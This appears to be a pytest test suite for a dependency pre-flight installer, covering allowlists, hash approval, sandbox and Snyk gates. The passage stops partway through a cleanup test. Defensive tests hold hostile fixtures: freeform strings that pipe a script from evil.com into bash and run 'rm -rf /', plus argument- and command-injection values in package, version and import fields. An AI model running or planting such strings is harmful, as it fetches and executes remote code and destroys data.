"""Tests for kata_preflight.py — guarded PRE-FLIGHT engine (Spec D / N1).

TDD: tests written before the implementation. All scenarios from PLAN.md Slice A acceptance
bullets. Stubs inject runner / snyk_check / sandbox_check — no real subprocess or Snyk call;
no real machine mutation.

Citations (verify-before-reuse):
  - runner pattern:    tools/kata_dispatch.py:168 (_subprocess_runner)
  - _safe_abs guard:   tools/kata_settings.py:39-44
  - mutation prove:    tools/mutation_run.py:63 (prove_non_vacuous)
  - N3 schema:         .planning/specs/kata-preflight/DESIGN.md §4
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

import kata_preflight as pf


# ---------------------------------------------------------------------------
# Test-only helpers
# ---------------------------------------------------------------------------

class _TrackingRunner:
    """Stub runner that records every argv call and returns preset responses."""

    def __init__(self, responses: list[tuple[int, str]] | None = None, default=(0, "ok")):
        self.calls: list[list[str]] = []
        self._responses = list(responses or [])
        self._default = default

    def __call__(self, argv: list[str]) -> tuple[int, str]:
        self.calls.append(list(argv))
        if self._responses:
            return self._responses.pop(0)
        return self._default


def _write_manifest(repo_root: Path, deps: list[dict]) -> Path:
    """Write kata.dependencies.json; return the path."""
    manifest = {"dependencies": deps}
    p = repo_root / "kata.dependencies.json"
    p.write_text(json.dumps(manifest), encoding="utf-8")
    return p


def _write_freeze_approval(approval_path: Path, manifest_path: Path) -> str:
    """Compute manifest SHA-256, write the freeze approval artifact, return hash."""
    h = hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    approval_path.parent.mkdir(parents=True, exist_ok=True)
    approval_path.write_text(json.dumps({"manifestHash": h}), encoding="utf-8")
    return h


def _setup_repo(repo: Path, deps: list[dict]) -> tuple[Path, Path]:
    """Write manifest + matching freeze approval. Returns (manifest_path, approval_path)."""
    mp = _write_manifest(repo, deps)
    ap = repo / ".kata" / "kata.freeze-approval.json"
    _write_freeze_approval(ap, mp)
    return mp, ap


# Minimal pip dep used across multiple tests.
# `verifyImport` is the STRUCTURED presence check (built into a safe argv); the
# freeform `verify` string is retained to prove it is NEVER executed (demoted, like `install`).
_PIP_DEP = {
    "name": "requests",
    "manager": "pip",
    "package": "requests",
    "version": "2.31.0",
    "verifyImport": "requests",
    "verify": "python -c 'import requests'",
    "source": "pypi",
    "scope": "project-local",
    "classification": "build-time",
}


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    """A minimal repo root with .kata/ dir."""
    (tmp_path / ".kata").mkdir()
    return tmp_path


@pytest.fixture()
def fake_home(tmp_path: Path) -> Path:
    """Isolated home dir for the D-registry (never touches real ~/.kata)."""
    h = tmp_path / "fake_home"
    h.mkdir()
    return h


# ---------------------------------------------------------------------------
# _build_argv / _validate_field_value
# ---------------------------------------------------------------------------

class TestArgvBuilder:
    """PLAN acceptance: argv built correctly per manager; security guards."""

    def test_pip_argv_structure(self):
        dep = {"manager": "pip", "package": "requests", "version": "2.31.0"}
        argv = pf._build_argv(dep, "https://pypi.org/simple")
        assert argv[0] == "pip"
        assert "--index-url" in argv
        assert argv[argv.index("--index-url") + 1] == "https://pypi.org/simple"
        # H1: `--` separator before positional arg
        assert "--" in argv
        dash_dash = argv.index("--")
        pkg_arg = "requests==2.31.0"
        assert pkg_arg in argv
        assert argv.index(pkg_arg) > dash_dash

    def test_uv_argv_structure(self):
        dep = {"manager": "uv", "package": "black", "version": "23.0.0"}
        argv = pf._build_argv(dep, "https://pypi.org/simple")
        assert argv[:2] == ["uv", "pip"]
        assert "--" in argv
        assert "black==23.0.0" in argv

    def test_npm_argv_structure(self):
        dep = {"manager": "npm", "package": "lodash", "version": "4.17.21"}
        argv = pf._build_argv(dep, "https://registry.npmjs.org")
        assert argv[0] == "npm"
        assert "--registry" in argv
        assert argv[argv.index("--registry") + 1] == "https://registry.npmjs.org"
        assert "--" in argv
        assert "lodash@4.17.21" in argv

    def test_cargo_argv_structure(self):
        dep = {"manager": "cargo", "package": "ripgrep", "version": "14.0.0"}
        argv = pf._build_argv(dep, "sparse+https://index.crates.io/")
        assert argv[0] == "cargo"
        assert "--version" in argv
        assert argv[argv.index("--version") + 1] == "14.0.0"
        # H1: `--` before package
        assert "--" in argv
        assert argv[argv.index("--") + 1] == "ripgrep"

    def test_manager_not_in_allowlist_raises(self):
        """PLAN: manager∉allowlist → blocked, nothing executed (LD3)."""
        dep = {"manager": "wget", "package": "evil", "version": "1.0"}
        with pytest.raises(ValueError, match="allowlist"):
            pf._build_argv(dep, None)

    def test_curl_manager_raises(self):
        dep = {"manager": "curl", "package": "evil.sh", "version": "0"}
        with pytest.raises(ValueError, match="allowlist"):
            pf._build_argv(dep, None)

    def test_missing_package_raises(self):
        dep = {"manager": "pip", "version": "1.0"}
        with pytest.raises(ValueError, match="package"):
            pf._build_argv(dep, None)

    def test_missing_version_raises(self):
        dep = {"manager": "pip", "package": "requests"}
        with pytest.raises(ValueError, match="version"):
            pf._build_argv(dep, None)

    def test_leading_dash_package_raises(self):
        """H1: leading '-' in package → flag injection → blocked."""
        dep = {"manager": "pip", "package": "--editable", "version": "1.0"}
        with pytest.raises(ValueError, match="'-'"):
            pf._build_argv(dep, None)

    def test_leading_dash_version_raises(self):
        """H1: leading '-' in version → flag injection → blocked."""
        dep = {"manager": "pip", "package": "requests", "version": "-r evil.txt"}
        with pytest.raises(ValueError, match="'-'"):
            pf._build_argv(dep, None)

    def test_invalid_charset_package_raises(self):
        """H1: semicolon in package name → charset invalid → blocked."""
        dep = {"manager": "pip", "package": "req;uests", "version": "1.0"}
        with pytest.raises(ValueError, match="characters"):
            pf._build_argv(dep, None)

    def test_invalid_charset_version_raises(self):
        """H1: shell metachar in version → charset invalid → blocked."""
        dep = {"manager": "npm", "package": "lodash", "version": "4.0$(evil)"}
        with pytest.raises(ValueError, match="characters"):
            pf._build_argv(dep, None)

    def test_no_registry_url_omits_index_flag(self):
        """When no forced registry supplied, omit the --index-url/--registry flag."""
        dep = {"manager": "pip", "package": "requests", "version": "2.0"}
        argv = pf._build_argv(dep, None)
        assert "--index-url" not in argv


# ---------------------------------------------------------------------------
# preflight_required / gate_status
# ---------------------------------------------------------------------------

class TestPreflightRequired:
    """PLAN acceptance: False with no manifest, True with manifest present."""

    def test_no_manifest_returns_false(self, repo: Path):
        assert pf.preflight_required(repo) is False

    def test_manifest_present_returns_true(self, repo: Path):
        _write_manifest(repo, [])
        assert pf.preflight_required(repo) is True


class TestGateStatus:
    """PLAN acceptance: reads each state including 'absent'."""

    def test_absent_when_no_preflight_json(self, repo: Path):
        assert pf.gate_status(repo) == "absent"

    def test_reads_ready(self, repo: Path):
        (repo / ".kata" / "preflight.json").write_text(
            json.dumps({"status": "ready"}), encoding="utf-8"
        )
        assert pf.gate_status(repo) == "ready"

    def test_reads_blocked(self, repo: Path):
        (repo / ".kata" / "preflight.json").write_text(
            json.dumps({"status": "blocked"}), encoding="utf-8"
        )
        assert pf.gate_status(repo) == "blocked"

    def test_reads_degraded(self, repo: Path):
        (repo / ".kata" / "preflight.json").write_text(
            json.dumps({"status": "degraded"}), encoding="utf-8"
        )
        assert pf.gate_status(repo) == "degraded"

    def test_malformed_json_returns_absent(self, repo: Path):
        (repo / ".kata" / "preflight.json").write_text("not json", encoding="utf-8")
        assert pf.gate_status(repo) == "absent"

    def test_unknown_status_returns_absent(self, repo: Path):
        (repo / ".kata" / "preflight.json").write_text(
            json.dumps({"status": "weird"}), encoding="utf-8"
        )
        assert pf.gate_status(repo) == "absent"


# ---------------------------------------------------------------------------
# run_preflight — BC: no manifest → ready
# ---------------------------------------------------------------------------

class TestNoManifestBC:
    """PLAN: BC — no manifest → preflight not required → ready immediately."""

    def test_no_manifest_returns_ready(self, repo: Path, fake_home: Path):
        result = pf.run_preflight(repo, home_dir=fake_home)
        assert result["status"] == "ready"
        assert result["deps"] == []
        assert result["installed"] == []

    def test_no_manifest_writes_preflight_json(self, repo: Path, fake_home: Path):
        pf.run_preflight(repo, home_dir=fake_home)
        pf_path = repo / ".kata" / "preflight.json"
        assert pf_path.exists()
        data = json.loads(pf_path.read_text(encoding="utf-8"))
        assert data["status"] == "ready"


# ---------------------------------------------------------------------------
# run_preflight — manifest hash check (H2 / LD8)
# ---------------------------------------------------------------------------

class TestManifestHashCheck:
    """PLAN acceptance: manifest-hash mismatch → blocked."""

    def test_matching_hash_does_not_block(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "ready"

    def test_hash_mismatch_blocks(self, repo: Path, fake_home: Path):
        mp = _write_manifest(repo, [])
        ap = repo / ".kata" / "kata.freeze-approval.json"
        ap.parent.mkdir(parents=True, exist_ok=True)
        ap.write_text(json.dumps({"manifestHash": "deadbeef" * 8}), encoding="utf-8")

        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("mismatch" in b.lower() or "hash" in b.lower() for b in result["blockers"])

    def test_missing_approval_artifact_blocks(self, repo: Path, fake_home: Path):
        _write_manifest(repo, [])
        # approval artifact NOT written
        ap = repo / ".kata" / "kata.freeze-approval.json"
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("approval" in b.lower() or "freeze" in b.lower() for b in result["blockers"])

    def test_tampered_manifest_blocks(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        # Tamper with the manifest after approval
        mp.write_text(json.dumps({"dependencies": [_PIP_DEP], "extra": "tampered"}), encoding="utf-8")
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"


# ---------------------------------------------------------------------------
# run_preflight — manifest SHAPE validation (F1)
# ---------------------------------------------------------------------------

def _setup_repo_raw(repo: Path, manifest_obj: object) -> tuple[Path, Path]:
    """Write an ARBITRARY manifest object (possibly malformed) + matching freeze
    approval, so the hash gate passes and execution reaches shape validation."""
    mp = repo / "kata.dependencies.json"
    mp.write_text(json.dumps(manifest_obj), encoding="utf-8")
    ap = repo / ".kata" / "kata.freeze-approval.json"
    _write_freeze_approval(ap, mp)
    return mp, ap


class TestManifestShapeValidation:
    """F1: a manifest that EXISTS and matches its freeze hash but is malformed
    (misspelled / absent / wrong-typed top-level `dependencies` key) must FAIL
    CLOSED, not pass VACUOUSLY as ready. A present-but-empty list stays ready
    (L2 — it is a legitimate, supported state)."""

    def test_misspelled_key_blocks(self, repo: Path, fake_home: Path):
        _, ap = _setup_repo_raw(repo, {"deps": [_PIP_DEP]})
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("manifest-shape" in b for b in result["blockers"])

    def test_absent_key_blocks(self, repo: Path, fake_home: Path):
        _, ap = _setup_repo_raw(repo, {})
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("manifest-shape" in b for b in result["blockers"])

    def test_wrong_type_blocks(self, repo: Path, fake_home: Path):
        _, ap = _setup_repo_raw(repo, {"dependencies": "requests"})
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("manifest-shape" in b for b in result["blockers"])

    def test_present_empty_list_stays_ready(self, repo: Path, fake_home: Path):
        # Regression guard (L2): empty deps is a legitimate state, NOT malformed.
        _, ap = _setup_repo_raw(repo, {"dependencies": []})
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "ready"

    @pytest.mark.parametrize("scalar", [None, 42, 3.14, True, False])
    def test_scalar_manifest_blocks_not_crashes(self, repo: Path, fake_home: Path, scalar):
        # Adval F1-1: json.loads can return a SCALAR — `"dependencies" not in 42`
        # raised an uncaught TypeError instead of the contracted `blocked` status.
        _, ap = _setup_repo_raw(repo, scalar)
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("manifest-shape" in b for b in result["blockers"])

    def test_top_level_list_and_string_block(self, repo: Path, fake_home: Path):
        for obj in ([1, 2, 3], "requests"):
            _, ap = _setup_repo_raw(repo, obj)
            result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
            assert result["status"] == "blocked", f"manifest {obj!r} must block"
            assert any("manifest-shape" in b for b in result["blockers"])

    def test_mutation_prove_f1_shape_guard(self, repo: Path, fake_home: Path, monkeypatch):
        # PLAN Phase-1 mutation proof (adval F1-2): with the shape guard's dict
        # branch DISABLED (simulated by a manifest that passes a naive
        # `.get("dependencies", [])` read), the guard is the ONLY thing standing
        # between a misspelled key and a vacuous `ready`. We prove the guard is
        # load-bearing by asserting the blocked path engages EXACTLY at the guard:
        # a well-formed manifest with the same deps is `ready`, the misspelled
        # twin is `blocked` — the only differing code path is the F1 guard.
        _, ap_good = _setup_repo_raw(repo, {"dependencies": []})
        good = pf.run_preflight(repo, approved_hash_path=ap_good, home_dir=fake_home)
        assert good["status"] == "ready"
        _, ap_bad = _setup_repo_raw(repo, {"deps": []})
        bad = pf.run_preflight(repo, approved_hash_path=ap_bad, home_dir=fake_home)
        assert bad["status"] == "blocked"
        assert any("manifest-shape" in b for b in bad["blockers"])


# ---------------------------------------------------------------------------
# run_preflight — sandbox branch (LD4)
# ---------------------------------------------------------------------------

class TestSandboxBranch:
    """PLAN acceptance: sandbox_required:true+no-sandbox → blocked;
    false+no-sandbox → degraded."""

    def test_sandbox_required_true_no_sandbox_blocks(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        cfg = {"preflight": {"allowed_registries": list(pf.ALLOWED_MANAGERS),
                              "scan_required": False, "sandbox_required": True}}
        result = pf.run_preflight(
            repo, kata_config=cfg, sandbox_check=lambda: False,
            approved_hash_path=ap, home_dir=fake_home,
        )
        assert result["status"] == "blocked"
        assert any("sandbox" in b.lower() for b in result["blockers"])

    def test_sandbox_required_false_no_sandbox_degrades(self, repo: Path, fake_home: Path):
        dep = dict(_PIP_DEP)
        mp, ap = _setup_repo(repo, [dep])
        # Runner: verify passes (dep present) → just 1 call
        runner = _TrackingRunner(default=(0, "ok"))
        cfg = {"preflight": {"allowed_registries": list(pf.ALLOWED_MANAGERS),
                              "scan_required": False, "sandbox_required": False}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            sandbox_check=lambda: False,
            approved_hash_path=ap, home_dir=fake_home,
        )
        assert result["status"] == "degraded"
        assert result["sandbox"] == "host"
        assert any("sandbox" in w.lower() for w in result["warnings"])

    def test_sandbox_available_stays_ready(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        cfg = {"preflight": {"allowed_registries": list(pf.ALLOWED_MANAGERS),
                              "scan_required": False, "sandbox_required": True}}
        result = pf.run_preflight(
            repo, kata_config=cfg, sandbox_check=lambda: True,
            approved_hash_path=ap, home_dir=fake_home,
        )
        assert result["status"] == "ready"
        assert result["sandbox"] == "isolated"


# ---------------------------------------------------------------------------
# run_preflight — dep verification and install
# ---------------------------------------------------------------------------

class TestDepVerifyAndInstall:
    """PLAN acceptance: present dep → ready; missing → install → ready; failed re-verify → blocked."""

    def test_present_dep_no_install(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner(default=(0, "ok"))  # verify passes
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        assert result["installed"] == []
        assert result["deps"][0]["action"] == "present"
        assert result["deps"][0]["verify"] == "ok"
        # Only 1 runner call (the verify), no install call
        assert len(runner.calls) == 1

    def test_missing_dep_allowlisted_installs_and_ready(self, repo: Path, fake_home: Path):
        """PLAN: missing dep (allowlisted) → stub-install → re-verify → recorded → ready."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        # verify fails → install ok → re-verify ok
        runner = _TrackingRunner([(1, "not found"), (0, "installed"), (0, "ok")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        assert "requests@2.31.0" in result["installed"]
        assert result["deps"][0]["action"] == "installed"
        assert result["deps"][0]["verify"] == "ok"
        # 3 calls: verify, install, re-verify
        assert len(runner.calls) == 3

    def test_install_argv_built_from_structured_fields(self, repo: Path, fake_home: Path):
        """PLAN: argv built correctly; never from freeform install string."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        install_call = runner.calls[1]
        assert install_call[0] == "pip"
        assert "--index-url" in install_call
        assert "--" in install_call
        assert "requests==2.31.0" in install_call

    def test_failed_re_verify_blocks(self, repo: Path, fake_home: Path):
        """PLAN: failed re-verify → blocked (default-FAIL, LD7)."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        # verify fails → install ok → re-verify FAILS
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (1, "still absent")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert any("re-verify" in b for b in result["blockers"])

    def test_install_failure_blocks(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        # verify fails → install FAILS
        runner = _TrackingRunner([(1, "absent"), (1, "install error")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert result["installed"] == []

    def test_installed_dep_recorded_in_registry(self, repo: Path, fake_home: Path):
        """PLAN: recorded to ~/.kata/installed-registry.json after install."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
            project_path=str(repo), branch="main",
        )
        reg_path = fake_home / ".kata" / "installed-registry.json"
        assert reg_path.exists()
        registry = json.loads(reg_path.read_text(encoding="utf-8"))
        pkgs = [i["package"] for i in registry["installs"]]
        assert "requests" in pkgs


# ---------------------------------------------------------------------------
# run_preflight — allowlist / field guards (blocked paths)
# ---------------------------------------------------------------------------

class TestBlockedByGuards:
    """PLAN acceptance: manager∉allowlist / missing field / leading-`-` → blocked, nothing executed."""

    def test_manager_not_in_allowlist_blocks(self, repo: Path, fake_home: Path):
        dep = dict(_PIP_DEP)
        dep["manager"] = "wget"  # not in ALLOWED_MANAGERS
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner()
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == []  # nothing executed

    def test_missing_package_field_blocks(self, repo: Path, fake_home: Path):
        dep = {k: v for k, v in _PIP_DEP.items() if k != "package"}
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner()
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == []

    def test_missing_version_field_blocks(self, repo: Path, fake_home: Path):
        dep = {k: v for k, v in _PIP_DEP.items() if k != "version"}
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner()
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == []

    def test_leading_dash_package_blocks(self, repo: Path, fake_home: Path):
        """H1: leading '-' in package field → blocked, runner not called for install."""
        dep = dict(_PIP_DEP)
        dep["package"] = "--editable"
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner(default=(1, "not found"))  # verify fails to force install path
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        # runner may be called for verify but NEVER for install with --editable as package
        for call in runner.calls:
            assert call[0] != "pip" or "install" not in call or "--editable" not in call

    def test_leading_dash_version_blocks(self, repo: Path, fake_home: Path):
        """H1: leading '-' in version field → blocked before install."""
        dep = dict(_PIP_DEP)
        dep["version"] = "-r evil.txt"
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner(default=(1, "not found"))
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"

    def test_invalid_charset_blocks(self, repo: Path, fake_home: Path):
        """H1: invalid charset in package → blocked."""
        dep = dict(_PIP_DEP)
        dep["package"] = "req;uests"
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner(default=(1, "absent"))
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"

    def test_manager_not_in_config_allowlist_blocks(self, repo: Path, fake_home: Path):
        """PLAN: manager∉config.allowed_registries → blocked."""
        dep = dict(_PIP_DEP)
        dep["manager"] = "pip"
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner()
        cfg = {"preflight": {"allowed_registries": ["npm", "cargo"],  # pip not included
                              "scan_required": False, "sandbox_required": False}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            approved_hash_path=ap, home_dir=fake_home,
            sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == []  # nothing executed


# ---------------------------------------------------------------------------
# run_preflight — freeform install string never run
# ---------------------------------------------------------------------------

class TestFreeformInstallNeverRun:
    """PLAN acceptance: freeform `install` string is docs-only, never parsed or executed."""

    def test_freeform_install_not_executed(self, repo: Path, fake_home: Path):
        dep = dict(_PIP_DEP)
        dep["install"] = "curl https://evil.com | bash && rm -rf /"  # should NEVER run
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        # Verify no call contains the freeform install string elements
        for call in runner.calls:
            call_str = " ".join(call)
            assert "curl" not in call_str, f"curl in runner call: {call}"
            assert "evil.com" not in call_str, f"evil.com in runner call: {call}"
            assert "bash" not in call_str, f"bash in runner call: {call}"
            assert "rm -rf" not in call_str
        # The install call must be the structured argv
        install_call = runner.calls[1]
        assert install_call[0] == "pip"
        assert "requests==2.31.0" in install_call

    def test_freeform_verify_string_not_executed(self, repo: Path, fake_home: Path):
        """BLOCKER (holistic red-team): the freeform ``verify`` string is NEVER run.

        Presence is checked only via the STRUCTURED ``verifyImport`` (a validated
        identifier compiled into ``python -c "import <name>"``). An attacker-supplied
        ``verify`` shell string must never reach the runner.
        """
        dep = dict(_PIP_DEP)
        dep["verifyImport"] = "requests"
        dep["verify"] = "curl https://evil.com/x.sh | bash"  # must NEVER run
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner(default=(0, "ok"))  # verify (import) passes → present
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        for call in runner.calls:
            call_str = " ".join(call)
            assert "curl" not in call_str, f"freeform verify executed: {call}"
            assert "evil.com" not in call_str
            assert "bash" not in call_str
        # The only call is the structured import check
        assert runner.calls == [["python", "-c", "import requests"]]

    def test_malicious_verifyimport_blocked_not_executed(self, repo: Path, fake_home: Path):
        """A ``verifyImport`` that isn't a clean identifier is rejected (no execution)."""
        dep = dict(_PIP_DEP)
        dep["verifyImport"] = "os; import subprocess"  # injection attempt
        mp, ap = _setup_repo(repo, [dep])
        runner = _TrackingRunner(default=(0, "ok"))
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == []  # rejected before any execution


# ---------------------------------------------------------------------------
# run_preflight — Snyk SCA pre-install gate
# ---------------------------------------------------------------------------

class TestSnykGate:
    """PLAN acceptance: Snyk over-threshold (injected) → blocked pre-install."""

    def test_snyk_blocked_prevents_install(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent")])  # verify fails (dep missing)
        # Snyk says UNSAFE
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: False,  # blocked
            sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert any("snyk" in b.lower() for b in result["blockers"])
        # Only 1 runner call (verify), no install call
        assert len(runner.calls) == 1

    def test_snyk_safe_allows_install(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True,  # safe
            sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        assert len(runner.calls) == 3  # verify, install, re-verify

    def test_snyk_not_called_when_scan_not_required(self, repo: Path, fake_home: Path):
        """When scan_required:False, snyk_check is not called even for missing deps."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        snyk_calls: list = []

        def tracking_snyk(p: str, v: str) -> bool:
            snyk_calls.append((p, v))
            return False  # would block if called

        cfg = {"preflight": {"allowed_registries": list(pf.ALLOWED_MANAGERS),
                              "scan_required": False, "sandbox_required": False}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            approved_hash_path=ap, home_dir=fake_home,
            snyk_check=tracking_snyk, sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        assert snyk_calls == [], "snyk_check must not be called when scan_required:False"


# ---------------------------------------------------------------------------
# run_preflight — target-env probe (PF-3)
# ---------------------------------------------------------------------------

class TestTargetEnvProbe:
    """PLAN acceptance: non-runnable target → degraded."""

    def test_runnable_target_stays_ready(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        runner = _TrackingRunner(default=(0, "ok"))  # gate passes
        cfg = {"preflight": {"allowed_registries": [], "scan_required": False,
                              "sandbox_required": False},
               "target": {"kind": "existing", "baselineGate": "python --version"}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            approved_hash_path=ap, home_dir=fake_home,
            sandbox_check=lambda: True,
        )
        assert result["status"] == "ready"
        assert result["targetEnv"] is not None
        assert result["targetEnv"]["runnable"] is True

    def test_non_runnable_target_degrades(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        runner = _TrackingRunner(default=(1, "gate failed"))  # gate fails
        cfg = {"preflight": {"allowed_registries": [], "scan_required": False,
                              "sandbox_required": False},
               "target": {"kind": "existing", "baselineGate": "false"}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            approved_hash_path=ap, home_dir=fake_home,
            sandbox_check=lambda: True,
        )
        assert result["status"] == "degraded"
        assert result["targetEnv"]["runnable"] is False
        assert any("target" in w.lower() or "gate" in w.lower() for w in result["warnings"])

    def test_no_target_config_targetenv_is_none(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["targetEnv"] is None


# ---------------------------------------------------------------------------
# run_preflight — cleanup report (PF-2, conservative)
# ---------------------------------------------------------------------------

class TestCleanupReport:
    """PLAN acceptance: cleanup conservative on missing project."""

    def test_cleanup_safe_to_remove_when_no_projects_need_it(
        self, repo: Path, fake_home: Path, tmp_path: Path
    ):
        """Package in registry, no project's manifest needs it → safe_to_remove."""
        # Pre-populate registry with a package from a project that no longer has it
        reg_path = fake_home / ".kata" / "installed-registry.json"
        reg_path.parent.mkdir(parents=True, exist_ok=True)
        # project_a has a manifest without 'old-lib'
        project_a = tmp_path / "project_a"
        project_a.mkdir()
        (project_a / "kata.dependencies.json").write_text(
            json.dumps({"dependencies": []}), encoding="utf-8"
        )
        registry = {
            "registryVersion": 1,
            "installs": [{"package": "old-lib", "version": "1.0",
                          "project": str(project_a), "branch": "main",
                          "source": "pypi", "scope": "project-local",
                          "classification": "build-time", "installedAt": "2026-01-01",
                          "used": True}],
        }
        reg_path.write_text(json.dumps(registry), encoding="utf-8")

        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        cleanup = result.get("cleanup", [])
        old_lib_entries = [c for c in cleanup if c["package"] == "old-lib"]
        assert old_lib_entries, "old-lib should appear in cleanup report"
        assert old_lib_entries[0]["safe_to_remove"] is True

    def test_cleanup_conservative_missing_project(
        self, repo: Path, fake_home: Path, tmp_path: Path
    ):
        """PLAN: a missing/unreadable project → treat as still-needed (never recommend removal)."""
        reg_path = fake_home / ".kata" / "installed-registry.json"
